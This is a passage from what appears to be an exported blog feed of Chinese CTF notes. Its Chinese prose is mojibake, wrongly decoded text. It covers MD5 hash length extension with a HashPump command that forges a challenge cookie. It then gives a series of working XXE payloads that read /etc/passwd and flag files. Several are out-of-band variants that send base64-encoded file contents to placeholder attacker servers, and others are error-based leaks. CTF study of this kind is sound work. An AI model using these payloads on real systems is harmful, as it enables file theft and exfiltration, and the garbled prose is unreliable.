ç»„å°±ä¼šè¿›è¡Œå¤šå°‘æ¬¡â€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€ã€‚æ¯æ¬¡è¿›è¡Œâ€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€éƒ½ä¼šç”Ÿæˆä¸€ç»„æ–°çš„registerså€¼ä¾›ä¸‹ä¸€æ¬¡â€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€æ¥è°ƒç”¨ã€‚ç¬¬ä¸€æ¬¡â€œå¤æ‚çš„æ•°å­¦å˜åŒ–â€ä¼šè°ƒç”¨ç¨‹åºä¸­çš„é»˜è®¤å€¼ã€‚å½“åé¢å·²ç»æ²¡æœ‰åˆ†ç»„å¯ä»¥è¿›è¡Œæ•°å­¦å˜åŒ–æ—¶ï¼Œè¯¥ç»„ç”Ÿæˆçš„registerså€¼å°±æ˜¯æœ€åçš„hashå€¼ã€‚ ä¸ºç¡®ä¿åŒä¸€ä¸ªå­—ç¬¦ä¸²çš„hashå€¼å”¯ä¸€ï¼Œæ‰€ä»¥éœ€è¦ä¿è¯ç¬¬ä¸€æ¬¡registersçš„å€¼ä¹Ÿå”¯ä¸€ã€‚æ‰€ä»¥åœ¨hashç®—æ³•ä¸­ï¼Œregisterså…·æœ‰åˆå§‹å€¼ã€‚å¦‚ä¸Šå›¾ä¸­çš„registerså€¼0ã€‚ md5çš„åŠ å¯†è¿‡ç¨‹æ€»ä½“æ€è·¯MD5åŠ å¯†è¿‡ç¨‹ä¸­512æ¯”ç‰¹ï¼ˆ64å­—èŠ‚ï¼‰ä¸ºä¸€ç»„ï¼Œå±äºåˆ†ç»„åŠ å¯†ï¼Œè€Œä¸”åœ¨è¿ç®—çš„è¿‡ç¨‹ä¸­ï¼Œå°†512æ¯”ç‰¹åˆ†ä¸º32bit*16å—ï¼Œåˆ†å—è¿ç®— æˆ‘ä»¬å…³é”®åˆ©ç”¨çš„æ˜¯MD5çš„å¡«å……ï¼Œå¯¹åŠ å¯†çš„å­—ç¬¦ä¸²è¿›è¡Œå¡«å……(æ¯”ç‰¹ç¬¬ä¸€ä½ä¸º1å…¶ä½™æ¯”ç‰¹ä¸º0)ï¼Œä½¿ä¹‹(äºŒè¿›åˆ¶)è¡¥åˆ°448æ¨¡512åŒä½™ï¼Œå³é•¿åº¦ä¸º512çš„å€æ•°å‡64ï¼Œæœ€åçš„64ä½åœ¨è¡¥å……ä¸ºåŸæ¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¿™æ ·åˆšå¥½è¡¥æ»¡512ä½çš„å€æ•°ï¼Œå¦‚æœå½“å‰æ˜æ–‡æ­£å¥½æ˜¯512bitå€æ•°åˆ™å†åŠ ä¸Šä¸€ä¸ª512bitçš„ä¸€ç»„ã€‚ MD5ä¸ç®¡æ€ä¹ˆåŠ å¯†ï¼Œæ¯ä¸€å—åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ä½œä¸ºä¸‹ä¸€æ¬¡åŠ å¯†çš„åˆå§‹å‘é‡IVï¼Œè¿™ä¸€ç‚¹å¾ˆå…³é”®ï¼ï¼ï¼ è¡¥ä½ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾æˆ‘ä»¬è¦å¯¹æŸä¸ªå­—ç¬¦ä¸²MD5åŠ å¯†ï¼Œé¦–å…ˆå…ˆè½¬æ¢æˆ16è¿›åˆ¶ æ³¨æ„ï¼šå­—ç¬¦æ˜¯ä»¥ASCIIç å­˜åœ¨çš„ï¼ŒASCIIç è½¬æ¢æˆäºŒè¿›åˆ¶æ•°å­˜åœ¨ï¼Œæ¯ä¸ªå­—ç¬¦ç›¸å½“äºä¸€å­—èŠ‚(1byte)å³8ä½(8bit) è€ŒMD5åŠ å¯†çš„è¿‡ç¨‹ä¸­ä¼šåˆ¤æ–­len(message) % 512bitæ˜¯å¦ä¸º448bitã€‚å¦‚æœæ˜¯çš„è¯ï¼Œå°±åœ¨åé¢å¡«å……8ä¸ªå­—èŠ‚(64bit)çš„é•¿åº¦æè¿°ç¬¦ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™åœ¨å…¶åé¢å¡«å……hex(80)å³è€Œè¿›è¡ŒäºŒè¿›åˆ¶çš„100000000ï¼Œç„¶åå†å¡«å……hex(00)ç›´åˆ°é•¿åº¦%512bit=448bitï¼Œç„¶åå°±æ˜¯å¡«å……8ä¸ªå­—èŠ‚çš„é•¿åº¦æè¿°ç¬¦ è¡¥é•¿åº¦é•¿åº¦æè¿°ç¬¦çš„å¡«å……å†…å®¹å³ä¸ºåŸåŠ å¯†å­—ç¬¦ä¸²çš„çš„bité•¿åº¦ï¼Œä¾‹å¦‚ç¤ºä¾‹æ˜¯4ä¸ªå­—èŠ‚ï¼Œ32bitï¼Œå¯¹åº”16è¿›åˆ¶å°±æ˜¯0x0000000000000020ï¼Œç”±äºå¡«å……æ—¶æ˜¯å°ç«¯åºæ”¾çš„ï¼Œé‚£ä¹ˆå¡«å……çš„æ•°æ®å°†ä¼šæ˜¯å°ç«¯åºå­˜æ”¾çš„ï¼Œå³0x2000000000000000 è®¡ç®—æ¶ˆæ¯æ‘˜è¦è®¡ç®—æ¶ˆæ¯æ‘˜è¦å¿…é¡»ç”¨è¡¥ä½å·²ç»è¡¥é•¿åº¦å®Œæˆä¹‹åçš„æ¶ˆæ¯æ¥è¿›è¡Œè¿ç®—ï¼Œæ‹¿å‡º 512 bitçš„æ¶ˆæ¯ï¼ˆå³64å­—èŠ‚ï¼‰ã€‚ è®¡ç®—æ¶ˆæ¯æ‘˜è¦çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªåˆå§‹çš„é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ã€‚MD5 çš„åˆå§‹é“¾å˜é‡ä¸ºï¼š 1234A&#x3D;0x67452301 B&#x3D;0xefcdab89 C&#x3D;0x98badcfe D&#x3D;0x10325476 ï¼ˆæ³¨æ„è¿™é‡Œè¿™4ä¸ªå€¼æ˜¯åœ¨md5ç®—æ³•ä¸­å†™æ­»çš„ï¼Œå†™æ­»çš„ã€‚ã€‚ã€‚ã€‚ï¼‰æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒè®¡ç®—ç»†èŠ‚ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦åï¼Œä¸Šé¢çš„é“¾å˜é‡å°†ä¼šè¢«æ–°çš„å€¼è¦†ç›–ï¼Œè€Œæœ€åä¸€è½®äº§ç”Ÿçš„é“¾å˜é‡ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆå¦‚ï¼šaabbccdd -&gt; ddccbbaaï¼‰åå°±æ˜¯æˆ‘ä»¬è®¡ç®—å‡ºæ¥çš„ md5 å€¼ã€‚ æ”»å‡»æ–¹å¼hashé•¿åº¦æ‰©å±•çš„å¤§æ¦‚æ„æ€å°±æ˜¯ï¼š å·²çŸ¥secreté•¿åº¦ï¼Œdataå€¼ï¼Œä»¥åŠsecret+dataçš„hashå€¼ï¼Œå°±å¯ä»¥æ±‚å‡ºsecret+å…¶ä»–æ•°æ®çš„hashå€¼ HashPumpHashPumpæ˜¯ä¸€ä¸ªå€ŸåŠ©äºOpenSSLå®ç°äº†é’ˆå¯¹å¤šç§æ•£åˆ—å‡½æ•°çš„æ”»å‡»çš„å·¥å…·ï¼Œæ”¯æŒé’ˆå¯¹MD5ã€CRC32ã€SHA1ã€SHA256å’ŒSHA512ç­‰é•¿åº¦æ‰©å±•æ”»å‡»ã€‚è€ŒMD2ã€SHA224å’ŒSHA384ç®—æ³•ä¸å—æ­¤æ”»å‡»çš„å½±å“ï¼Œå› å…¶éƒ¨åˆ†é¿å…äº†å¯¹çŠ¶æ€å˜é‡çš„è¾“å‡ºï¼Œå¹¶ä¸è¾“å‡ºå…¨éƒ¨çš„çŠ¶æ€å˜é‡ã€‚ å®‰è£…æ­¥éª¤ï¼š 1234git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmake CTFé¢˜ç›®å®éªŒå§æºç ï¼š 12345678910111213141516171819202122&lt;?phperror_reporting(0);include(&#x27;flag.php&#x27;);setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));// This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) &#123; if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123; if ($_COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123; echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); &#125; else &#123; die (&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;); &#125; &#125; else &#123; die (&quot;You are not an admin! LEAVE.&quot;); &#125;&#125;highlight_file(__FILE__); æŠ“åŒ…åœ¨Cookieé‡Œæˆ‘ä»¬çœ‹åˆ°äº†$secret+&#39;adminadmin&#39;çš„MD5å€¼ï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦æ±‚$secret+&#39;admin&#39;+å…¶ä»–å€¼çš„MD5å€¼å°±èƒ½å¾—åˆ°flagï¼Œå·²çŸ¥$secreté•¿åº¦ä¸º15ï¼ŒåŠ ä¸Šadminé•¿åº¦ä¸º20ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±èƒ½ç”¨hashpump è¿˜å¯ä»¥ç›´æ¥ç”¨å‘½ä»¤è¡Œå½¢å¼ 1hashpump -s 49848099cde7e537e5fe4d88d0ba90f8 -d admin -k 20 -a moonback æŠŠ\\xæ›¿æ¢æˆ% å¯ä»¥çœ‹åˆ°æˆåŠŸå¾—åˆ°flag JarvisOJhttps://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ NPUCTFå‚è§:http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C å‚è€ƒï¼š https://blog.blacsheep.cn/2017/12/10/md5é•¿åº¦æ‰©å±•æ”»å‡»/ https://gtfly.github.io/2019/03/21/Hashé•¿åº¦æ‰©å±•æ”»å‡»å­¦ä¹ /","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"hash","slug":"hash","permalink":"http://www.m00nback.xyz/tags/hash/"}]},{"title":"XXEå­¦ä¹ ","slug":"xxe-study","date":"2019-12-14T11:52:03.000Z","updated":"2020-02-25T12:31:00.815Z","comments":true,"path":"2019/12/14/xxe-study/","link":"","permalink":"http://www.m00nback.xyz/2019/12/14/xxe-study/","excerpt":"æœ¬ç¯‡åšå®¢ç®€å•ä»‹ç»äº†XXEæ¼æ´çš„åŸç†å’Œå¸¸è§åˆ©ç”¨æ–¹å¼ï¼ï¼ï¼","text":"æœ¬ç¯‡åšå®¢ç®€å•ä»‹ç»äº†XXEæ¼æ´çš„åŸç†å’Œå¸¸è§åˆ©ç”¨æ–¹å¼ï¼ï¼ï¼ ä»€ä¹ˆæ˜¯XXE?XXEæ¼æ´å…¨ç§°XML External Entity Injectionï¼Œå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ æœ‰å¯èƒ½é€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³ xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ XXEæ¼æ´ä»£ç ä»¥buuojä¸ŠRealéƒ¨åˆ†[PHP]XXEä¸ºä¾‹ï¼Œä¸Šé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š simplexml_load_string.phpï¼š 12345&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = simplexml_load_string($data);echo $xml-&gt;name; SimpleXMLElement.phpï¼š 12345&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = new SimpleXMLElement($data);echo $xml-&gt;name; dom.php: 1234567&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom); æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„payload: 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; XMLäº†è§£XXEä¸€å®šè¦äº†è§£XMLä¸€äº›ç»å¸¸ä½¿ç”¨çš„è¯­æ³•ï¼ XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚ 12345678910111213141516&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!--XMLç”³æ˜--&gt;&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;&lt;!DOCTYPE note [ &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]&gt;&lt;!--æ–‡æ¡£å…ƒç´ --&gt;&lt;note&gt;&lt;to&gt;Mooback&lt;&#x2F;to&gt;&lt;from&gt;Moonback&lt;&#x2F;from&gt;&lt;head&gt;XXE&lt;&#x2F;head&gt;&lt;body&gt;I am learning XML.&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; ç”¨æµè§ˆå™¨æ‰“å¼€å¯ä»¥çœ‹åˆ° DTDå®ä½“å®ä½“æ˜¯å¯¹æ•°æ®çš„å¼•ç”¨ã€‚ å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ï¼Œä¸€èˆ¬åˆ†ä¸ºå­—ç¬¦å®ä½“ï¼Œå‘½åå®ä½“ï¼Œå¤–éƒ¨å®ä½“ï¼Œå‚æ•°å®ä½“ï¼Œæ‰€æœ‰å®ä½“ï¼ˆé™¤å‚æ•°å®ä½“å¤–ï¼‰éƒ½ä»¥ä¸€ä¸ªä¸å­—ç¬¦ï¼ˆ&amp;ï¼‰å¼€å§‹ï¼Œä»¥ä¸€ä¸ªåˆ†å·ï¼ˆ;ï¼‰ç»“æŸã€‚ å­—ç¬¦å®ä½“ï¼š å¯¹äºå­—ç¬¦å®ä½“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åè¿›åˆ¶æ ¼å¼ï¼ˆ&amp;#nnn;ï¼Œå…¶ä¸­ nnn æ˜¯å­—ç¬¦çš„åè¿›åˆ¶å€¼ï¼‰æˆ–åå…­è¿›åˆ¶æ ¼å¼ï¼ˆ&amp;#xhhh;ï¼Œå…¶ä¸­hhh æ˜¯å­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ï¼‰æ¥æŒ‡å®šä»»æ„ Unicode å­—ç¬¦ã€‚ ä¸¾ä¸ªä¾‹å­ï¼šå¤§å†™å­—æ¯ A æ˜¯ Unicode å­—ç¬¦ U+0065ã€‚å¦‚æœæƒ³å°†å…¶è¡¨ç¤ºä¸ºä¸€ä¸ªå­—ç¬¦å®ä½“ï¼Œå¯ä»¥è¾“å…¥ &amp;#65;ï¼ˆåè¿›åˆ¶å€¼ï¼‰æˆ– &amp;#xa9;ï¼ˆåå…­è¿›åˆ¶å€¼ï¼‰ å‘½åå®ä½“(å†…éƒ¨å®ä½“)ï¼š 1&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; å‘½åå®ä½“åœ¨ DTD æˆ–å†…éƒ¨å­é›†ï¼ˆå³æ–‡æ¡£ä¸­ &lt;!DOCTYPE&gt; è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼‰ä¸­å£°æ˜ï¼Œåœ¨æ–‡æ¡£ä¸­ç”¨ä½œå¼•ç”¨ã€‚åœ¨ XML æ–‡æ¡£è§£æè¿‡ç¨‹ä¸­ï¼Œå®ä½“å¼•ç”¨å°†ç”±å®ƒçš„è¡¨ç¤ºæ›¿ä»£ã€‚ å¤–éƒ¨å®ä½“: 1&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; å¤–éƒ¨å®ä½“è¡¨ç¤ºå¤–éƒ¨æ–‡ä»¶çš„å†…å®¹ï¼Œåœ¨æœ‰äº›æƒ…å†µä¸‹å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚è¯´ï¼Œæ‚¨åœ¨åˆ›å»ºä¸€æœ¬å›¾ä¹¦å¹¶ä¸”æƒ³å°†æ¯ä¸€ç« å­˜å‚¨ä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ã€‚æ‚¨å¯èƒ½ä¼šåˆ›å»ºä¸€ç»„å¦‚ä¸‹æ‰€ç¤ºçš„å®ä½“ã€‚ 123&lt;!ENTITY chap1 SYSTEM &quot;chapter-1.xml&quot;&gt;&lt;!ENTITY chap2 SYSTEM &quot;chapter-2.xml&quot;&gt;&lt;!ENTITY chap3 SYSTEM &quot;chapter-3.xml&quot;&gt; ç°åœ¨ï¼Œå½“æ‚¨åœ¨ä¸»å›¾ä¹¦ XML æ–‡ä»¶ä¸­å°†è¿™äº›å®ä½“æ”¾åˆ°ä¸€èµ·æ—¶ï¼Œè¿™äº›æ–‡ä»¶çš„å†…å®¹å°†æ’å…¥åœ¨å¼•ç”¨ç‚¹ã€‚ 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY chap1 SYSTEM &quot;chapter-1.xml&quot;&gt; &lt;!ENTITY chap2 SYSTEM &quot;chapter-2.xml&quot;&gt; &lt;!ENTITY chap3 SYSTEM &quot;chapter-3.xml&quot;&gt; &amp;chap1; &amp;chap2; &amp;chap3;]&gt; ç”±äºè¿™äº›æ–‡ä»¶çš„å†…å®¹è¢«æ’å…¥åˆ° XML æ–‡æ¡£ä¸­ï¼Œå› æ­¤å®ƒä»¬ä¹Ÿå¿…é¡»æ˜¯æœ‰æ•ˆçš„ XMLï¼Œè€Œä¸”å®ƒä»¬å¿…é¡»æ˜¯å¹³è¡¡çš„.å½“ä¸Šé¢çš„ XML æ–‡æ¡£è¢«è§£ææ—¶ï¼Œå®ƒå°†è¢«è¯»å–ä¸ºä¸€ä¸ªå¤§æ–‡æ¡£ï¼ŒåŒ…å« chapter-1.xmlã€chapter-2.xml å’Œ chapter-3.xml æ–‡ä»¶çš„å†…å®¹ã€‚ å‚æ•°å®ä½“ï¼š 123&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;æˆ–è€…&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; å‚æ•°å®ä½“åªç”¨äº DTD å’Œæ–‡æ¡£çš„å†…éƒ¨å­é›†ä¸­ã€‚å®ƒä»¬ä½¿ç”¨ç™¾åˆ†å·ï¼ˆ%ï¼‰è€Œä¸æ˜¯ä¸å­—ç¬¦ï¼Œå¯ä»¥æ˜¯å‘½åå®ä½“æˆ–å¤–éƒ¨å®ä½“ã€‚ æ³¨æ„ç‚¹ï¼š å‚æ•°å®ä½“å¿…é¡»å®šä¹‰åœ¨å•ç‹¬çš„DTDæ–‡æ¡£ä¸­æˆ–XMLæ–‡æ¡£çš„DTDåŒº(ä½†æ˜¯å¼•ç”¨åªèƒ½åœ¨DTDæ–‡æ¡£ä¸­ï¼Œå³å¤–éƒ¨å­é›†ï¼Œè€Œä¸èƒ½åœ¨XMLæ–‡æ¡£çš„DTDåŒº)ï¼Œå‰è€…ä¸ºè¯¥XMLæ–‡æ¡£çš„å¤–éƒ¨å­é›†ï¼Œåè€…ä¸ºè¯¥XMLæ–‡æ¡£çš„å†…éƒ¨å­é›†ã€‚ å‚æ•°å®ä½“çš„ä½œç”¨æ˜¯ä½œä¸ºDTDä¸­çš„å…ƒç´ çš„æ¡ä»¶æ§åˆ¶ã€‚å‚æ•°å®ä½“å®šä¹‰ä»¥%ä½œä¸ºå¼€å¤´ï¼Œå¼•ç”¨ä¹Ÿä»¥%å¼€å¤´ï¼Œä»¥;ç»“å°¾ è¯­æ³•å¼•ç”¨å¤–éƒ¨çš„å®ä½“ï¼Œè€Œéå†…éƒ¨å®ä½“ï¼Œé‚£ä¹ˆURLä¸­èƒ½å†™å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“å‘¢ï¼Ÿ ä¸»è¦çš„æœ‰fileã€httpã€httpsã€ftpç­‰ç­‰ï¼Œå½“ç„¶ä¸åŒçš„ç¨‹åºæ”¯æŒçš„ä¸ä¸€æ ·ï¼š æ¼æ´åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http://yourhost/test.xml&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt; 12345&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;ticket&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;code&gt;dsad&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt; å¼•å…¥æœåŠ¡å™¨DTDæ–‡ä»¶Blind XXE(OOB)ç¬¬ä¸€ç§æ–¹å¼ï¼š payload: 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % remote SYSTEM &quot;http://your_vps/test.dtd&quot;&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; vpsä¸Šçš„test.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;your_vps&#x2F;get.php?file&#x3D;%file;&#39;&gt;&quot;&gt; æ³¨æ„ï¼šå¦‚æœå®šä¹‰æˆå‚æ•°å®ä½“çš„è¯%éœ€è¦å®ä½“ç¼–ç  ç¬¬äºŒç§æ–¹å¼: è‡ªå·±vpsä¸Šçš„dtd 12&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;myip:10001&#x2F;?%file;&#39;&gt;&quot;&gt;%start; payload: 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http://myip/xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;/message&gt; ä½¿ç”¨çš„php://filterå°†æ–‡ä»¶å†…å®¹è¿›è¡Œäº†base64ç¼–ç ï¼Œå› ä¸ºå½“æˆ‘ä»¬è¯»å–çš„æ–‡ä»¶æ˜¯phpæˆ–åˆ™htmlæ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶çš„ä»£ç åŒ…å«&lt; &gt;ç¬¦å·æ—¶ä¼šå¯¼è‡´è§£æé”™è¯¯ è®©å­˜åœ¨æ¼æ´çš„åœ°æ–¹å…ˆåŠ è½½è‡ªå·±æœåŠ¡å™¨ä¸Šçš„dtdæ–‡ä»¶ï¼Œç„¶åè®©å…¶è¯·æ±‚å¹¶å¸¦ä¸Šåˆ©ç”¨phpä¼ªåè®®base64åŠ å¯†çš„æ–‡ä»¶å†…å®¹ï¼Œé€šè¿‡æœåŠ¡ç«¯çš„æ—¥å¿—å³å¯åšåˆ°ä¸å›æ˜¾çš„ä»»æ„æ–‡ä»¶è¯»å– ç¬¬ä¸‰ç§æ–¹å¼: vpsä¸Šçš„test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; payloadï¼š 123456&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;test.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;msg&gt;&lt;id&gt;moonback&lt;&#x2F;id&gt;&lt;name&gt;aasd&lt;&#x2F;name&gt;&lt;level&gt;1000&lt;&#x2F;level&gt;&lt;time&gt;415441&lt;&#x2F;time&gt;&lt;&#x2F;msg&gt; è¿™ç§çš„å¥½å¤„æ˜¯æ²¡æœ‰file://,php://filterç­‰å…³é”®è¯ åŸºäºæŠ¥é”™çš„Blind XXEåŸºäºæŠ¥é”™çš„åŸç†å’ŒOOBç±»ä¼¼ï¼ŒOOBé€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ® é€šè¿‡å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶ xml.dtd 12&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;hhhhhhh&#x2F;%file;&#39;&gt;&quot;&gt;%start; payload 12345678&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;you_vps&#x2F;xml.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; %remote; %send;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; é€šè¿‡å¼•å…¥æœ¬åœ°æ–‡ä»¶ 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#39;&gt; %remote;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; CoogleCTFä¸Šçš„ä¸€é“é¢˜ï¼šé“¾æ¥ writeup payloadï¼š 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#39;&gt; 